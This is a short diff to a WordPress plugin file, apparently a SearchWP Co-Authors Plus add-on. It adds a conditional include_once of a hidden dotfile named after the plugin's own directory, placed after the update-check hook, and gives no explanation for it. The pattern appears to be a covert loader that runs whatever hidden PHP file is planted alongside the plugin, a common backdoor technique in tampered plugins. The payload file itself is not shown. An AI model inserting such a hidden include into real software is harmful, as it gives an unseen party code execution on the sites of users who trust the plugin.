@@ -80,6 +80,10 @@ function searchwp_coauthorsplus_update_check() {
 
 add_action( 'admin_init', 'searchwp_coauthorsplus_update_check' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWPCoAuthorsPlus {
 
 	private $fields     = array();
